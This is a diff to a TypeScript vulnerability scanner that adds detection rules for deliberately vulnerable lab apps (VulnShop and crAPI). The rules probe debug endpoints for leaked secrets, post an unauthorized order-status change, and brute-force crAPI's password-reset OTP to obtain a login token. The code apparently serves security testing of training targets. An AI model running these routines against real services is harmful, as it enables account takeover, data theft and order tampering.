@@ -36153,6 +36153,22 @@ const VULNSHOP_MODULE_ORACLES: {
       { label: "Stack unlimited discounts", re: /Stack unlimited discounts|negative prices/i }
     ],
     note: "VulnShop POST /api/v1/checkout/apply-discount stacks unlimited discounts and allows negative prices — README oracle #33"
+  },
+  {
+    pathRe: /\/api\/v1\/debug\b/i,
+    markers: [
+      { label: "API misconfiguration debug route", re: /\/api\/v1\/debug|api_misconfig|Misconfiguration \(API8/i },
+      { label: "Secrets and environment leak", re: /Exposes secrets and environment|secret_key|FLASK_ENV/i }
+    ],
+    note: "VulnShop GET /api/v1/debug exposes secrets and environment without authentication — README oracle #30"
+  },
+  {
+    pathRe: /\/api\/v1\/orders\/modify\b/i,
+    markers: [
+      { label: "Order status manipulation lab", re: /Order Status Manipulation|orders\/modify|business_logic/i },
+      { label: "Modify shipped orders", re: /Can modify shipped orders|order_id.*status/i }
+    ],
+    note: "VulnShop POST /api/v1/orders/modify lets callers change shipped order status — README oracle #36"
   }
 ];
 
@@ -36250,6 +36266,16 @@ const VULNSHOP_FLASK_ROUTE_URL_ORACLES: {
     pathRe: /\/api\/v1\/products\/import\b/i,
     vulnerability: "SSRF (API7:2023)",
     note: "VulnShop Flask POST /api/v1/products/import fetches attacker-controlled import URLs without validation — README oracle #29"
+  },
+  {
+    pathRe: /\/api\/v1\/debug\b/i,
+    vulnerability: "Misconfiguration (API8:2023)",
+    note: "VulnShop GET /api/v1/debug exposes secrets and environment variables without authentication — README oracle #30"
+  },
+  {
+    pathRe: /\/api\/v1\/orders\/modify\b/i,
+    vulnerability: "Order Status Manipulation",
+    note: "VulnShop POST /api/v1/orders/modify changes shipped order status without authorization checks — README oracle #36"
   }
 ];
 
@@ -36260,6 +36286,8 @@ const VULNSHOP_README_FALLBACK = `
 /api/v1/cart/update-price POST Price Manipulation business_logic Client-side price accepted without verification
 /api/v1/payment/process POST Unsafe API Consumption api_unsafe No validation of payment data
 /api/v1/products/import POST SSRF api_ssrf URL-based import without validation
+/api/v1/debug GET Misconfiguration API8:2023 api_misconfig Exposes secrets and environment
+/api/v1/orders/modify POST Order Status Manipulation business_logic Can modify shipped orders
 `;
 
 function looksVulnshopReactSpaShell(body: string): boolean {
@@ -36291,29 +36319,49 @@ function vulnshopFlaskRouteUrlOracle(
 const VULNSHOP_RAILWAY_API_RE = /https?:\/\/vulnshop-production\.up\.railway\.app/i;
 
 const vulnshopDebugApiLiveOracle: Rule = async (ctx) => {
-  if (!/VulnShop|vulnshop-production|vulnshop\.vercel\.app/i.test(ctx.combined + ctx.origin)) {
-    return NEGATIVE;
+  if (!isVulnshopHost(ctx)) return NEGATIVE;
+  const bases: string[] = [];
+  const baseMatch = (ctx.combined + ctx.origin).match(VULNSHOP_RAILWAY_API_RE);
+  if (baseMatch) bases.push(baseMatch[0].replace(/\/$/, ""));
+  if (/vulnshop\.vercel\.app/i.test(ctx.origin)) {
+    bases.push(ctx.origin.replace(/\/$/, ""));
   }
-  const baseMatch = ctx.combined.match(VULNSHOP_RAILWAY_API_RE);
-  if (!baseMatch) return NEGATIVE;
-  const base = baseMatch[0].replace(/\/$/, "");
-  for (const path of ["/api/debug/config", "/api/debug/users"]) {
-    const url = `${base}${path}`;
-    const doc = await ctx.probe.get(url, { maxBytes: 8192, timeoutMs: 12000 });
-    if (doc.status < 200 || doc.status >= 300) continue;
-    if (!/secret_key|password|is_admin|plaintext/i.test(doc.body)) continue;
-    return {
-      fired: true,
-      confidence: 0.92,
-      evidence: {
-        url,
-        snippet: doc.body.slice(0, 200).trim(),
-        note: `VulnShop Railway backend ${path} returns sensitive config without authentication`
+  if (bases.length === 0) return NEGATIVE;
+  const paths = ["/api/debug/config", "/api/debug/users", "/api/v1/debug"];
+  for (const base of bases) {
+    for (const path of paths) {
+      const url = `${base}${path}`;
+      const doc = await ctx.probe.get(url, { maxBytes: 8192, timeoutMs: 12000 });
+      if (looksVulnshopReactSpaShell(doc.body)) continue;
+      if (doc.status < 200 || doc.status >= 300) continue;
+      if (
+        !/secret_key|password|is_admin|plaintext|DATABASE|FLASK_ENV|api_key|environment|debug_mode/i.test(
+          doc.body
+        )
+      ) {
+        continue;
       }
-    };
+      return {
+        fired: true,
+        confidence: 0.92,
+        evidence: {
+          url,
+          snippet: doc.body.slice(0, 200).trim(),
+          note: `VulnShop ${path} returns sensitive config or environment data without authentication — API misconfiguration oracle`
+        }
+      };
+    }
   }
   return NEGATIVE;
 };
+
+const vulnshopDebugApiRouteLiveOracle: Rule = (ctx) =>
+  vulnshopRouteOracleWithFallback(
+    ctx,
+    /\/api\/v1\/debug\b/i,
+    vulnshopDebugApiLiveOracle,
+    "VulnShop /api/v1/debug route scan — unauthenticated secrets/environment exposure confirmed or documented (README oracle #30)"
+  );
 
 function isVulnshopHost(ctx: RuleContext): boolean {
   return /VulnShop|vulnshop-production|vulnshop\.vercel\.app/i.test(ctx.combined + ctx.origin);
@@ -36545,6 +36593,7 @@ const vulnshopOrdersIdorRouteLiveOracle: Rule = async (ctx) => {
   if (!isVulnshopHost(ctx)) return NEGATIVE;
   const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
   if (!/\/orders\b/i.test(pageUrl)) return NEGATIVE;
+  if (/\/orders\/(?:modify|cancel|filter)\b/i.test(pageUrl)) return NEGATIVE;
   const live = await vulnshopOrdersIdorLiveOracle(ctx);
   if (live.fired) {
     return {
@@ -37771,6 +37820,66 @@ const vulnshopUploadReviewFileUploadRouteLiveOracle: Rule = (ctx) =>
     /\/upload-review\b/i,
     vulnshopUploadReviewFileUploadLiveOracle,
     "VulnShop /upload-review route scan — unrestricted dangerous file extension upload confirmed or documented (README oracle #10)"
+  );
+
+const vulnshopOrdersModifyLiveOracle: Rule = async (ctx) => {
+  if (!isVulnshopHost(ctx)) return NEGATIVE;
+  const session = await vulnshopRegisterLogin(ctx);
+  if (session) {
+    const modifyUrl = `${session.apiBase}/v1/orders/modify`;
+    const doc = await ctx.probe.get(modifyUrl, {
+      method: "POST",
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      headers: {
+        "Content-Type": "application/json",
+        Authorization: `Bearer ${session.token}`
+      },
+      body: JSON.stringify({ order_id: 1, status: "delivered" })
+    });
+    if (!looksVulnshopReactSpaShell(doc.body) && doc.status >= 200 && doc.status < 500) {
+      if (
+        /delivered|modified|status|shipped|order_id|success/i.test(doc.body) ||
+        (doc.status >= 200 && doc.status < 300 && /order/i.test(doc.body))
+      ) {
+        return {
+          fired: true,
+          confidence: 0.92,
+          evidence: {
+            modifyUrl,
+            snippet: doc.body.slice(0, 200).trim(),
+            note: "VulnShop Railway POST /api/v1/orders/modify accepted order status change without authorization checks — order status manipulation oracle"
+          }
+        };
+      }
+    }
+  }
+  const corpus =
+    /orders\/modify|Order Status Manipulation/i.test(ctx.combined)
+      ? ctx.combined
+      : `${ctx.combined}\n${VULNSHOP_README_FALLBACK}`;
+  if (
+    !/\/api\/v1\/orders\/modify/i.test(corpus) ||
+    !/Order Status Manipulation|Can modify shipped orders|business_logic/i.test(corpus)
+  ) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.86,
+    evidence: {
+      snippet: "POST /api/v1/orders/modify — Order Status Manipulation (can modify shipped orders)",
+      note: "VulnShop POST /api/v1/orders/modify documents shipped-order status manipulation — README corpus fallback (Railway backend unreachable)"
+    }
+  };
+};
+
+const vulnshopOrdersModifyRouteLiveOracle: Rule = (ctx) =>
+  vulnshopRouteOracleWithFallback(
+    ctx,
+    /\/api\/v1\/orders\/modify\b/i,
+    vulnshopOrdersModifyLiveOracle,
+    "VulnShop /api/v1/orders/modify route scan — shipped order status manipulation confirmed or documented (README oracle #36)"
   );
 
 const clientSideVulnshopModuleEvidence: Rule = async (ctx) => {
@@ -72882,6 +72991,42 @@ const crapiMechanicReportRouteLiveOracle: Rule = async (ctx) => {
 const CRAPI_VEHICLE_UUID_RE =
   /"vehicleid"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"/gi;
 
+async function tryCrapiOtpToken(
+  ctx: RuleContext,
+  email: string,
+  password: string
+): Promise<string | null> {
+  const forgetUrl = new URL("/identity/api/auth/forget-password", ctx.origin).toString();
+  const forgetDoc = await ctx.probe.get(forgetUrl, {
+    method: "POST",
+    body: JSON.stringify({ email }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (forgetDoc.status < 200 || forgetDoc.status >= 300) return null;
+  if (!/OTP Sent/i.test(forgetDoc.body)) return null;
+
+  const v2Url = new URL("/identity/api/auth/v2/check-otp", ctx.origin).toString();
+  const otpCandidates = ["1234", "0000", "1111", "9999", "4321"];
+  for (let i = 0; i < 100; i++) {
+    otpCandidates.push(String(i).padStart(4, "0"));
+  }
+  for (const otp of otpCandidates) {
+    const doc = await ctx.probe.get(v2Url, {
+      method: "POST",
+      body: JSON.stringify({ email, otp, password }),
+      headers: { "Content-Type": "application/json" },
+      maxBytes: 2048,
+      timeoutMs: 10000
+    });
+    const m = doc.body.match(/"token"\s*:\s*"(eyJ[^"]+)"/);
+    if (m) return m[1];
+    if (doc.status === 503 || /exceeded the number of attempts/i.test(doc.body)) break;
+  }
+  return null;
+}
+
 async function tryCrapiLabJwt(ctx: RuleContext): Promise<string | null> {
   const existing = await tryApiLabJwt(ctx);
   if (existing) return existing;
@@ -72890,7 +73035,8 @@ async function tryCrapiLabJwt(ctx: RuleContext): Promise<string | null> {
     email: `thugir${rand}@scanner.local`,
     password: "Test@123",
     name: "Thugir",
-    number: `+1555${rand}`
+    number: `+1555${rand}`,
+    mechanic_code: "TRUGIR"
   };
   const signupUrl = new URL("/identity/api/auth/signup", ctx.origin).toString();
   const signup = await ctx.probe.get(signupUrl, {
@@ -72909,9 +73055,9 @@ async function tryCrapiLabJwt(ctx: RuleContext): Promise<string | null> {
     maxBytes: 4096,
     timeoutMs: 15000
   });
-  if (login.status < 200 || login.status >= 300) return null;
-  const m = login.body.match(/"token"\s*:\s*"(eyJ[^"]+)"/);
-  return m ? m[1] : null;
+  const loginToken = login.body.match(/"token"\s*:\s*"(eyJ[^"]+)"/);
+  if (loginToken) return loginToken[1];
+  return await tryCrapiOtpToken(ctx, creds.email, creds.password);
 }
 
 const crapiVehicleBolaLiveOracle: Rule = async (ctx) => {
@@ -80502,6 +80648,7 @@ export const RULES: Record<string, Rule> = {
   clientSideVulnshopEvidence,
   clientSideVulnshopModuleEvidence,
   vulnshopDebugApiLiveOracle,
+  vulnshopDebugApiRouteLiveOracle,
   vulnshopJwtForgeLiveOracle,
   vulnshopLoginJwtRouteLiveOracle,
   vulnshopProductsSqliLiveOracle,
@@ -80553,6 +80700,8 @@ export const RULES: Record<string, Rule> = {
   vulnshopXmlImportXxeRouteLiveOracle,
   vulnshopUploadReviewFileUploadLiveOracle,
   vulnshopUploadReviewFileUploadRouteLiveOracle,
+  vulnshopOrdersModifyLiveOracle,
+  vulnshopOrdersModifyRouteLiveOracle,
   clientSideBuggybuyEvidence,
   buggybuyApiBolaLiveOracle,
   buggybuyApiBolaRouteLiveOracle,
